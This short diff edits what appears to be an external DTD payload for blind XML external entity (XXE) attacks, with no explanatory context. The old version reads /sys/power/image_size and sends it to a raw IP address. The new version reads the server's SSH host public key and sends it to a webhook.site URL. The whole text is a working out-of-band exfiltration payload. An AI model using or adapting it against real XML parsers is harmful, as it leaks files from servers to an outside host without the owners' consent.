@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///sys/power/image_size">
-<!ENTITY % all "<!ENTITY send SYSTEM 'mailto://35.238.26.60:2121/?%file;'>">
+<!ENTITY % key SYSTEM "file:///etc/ssh/ssh_host_rsa_key.pub">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/713045de-6ad1-41fb-8a8a-03bd4a80a25c/?%key;'>">
 %all;
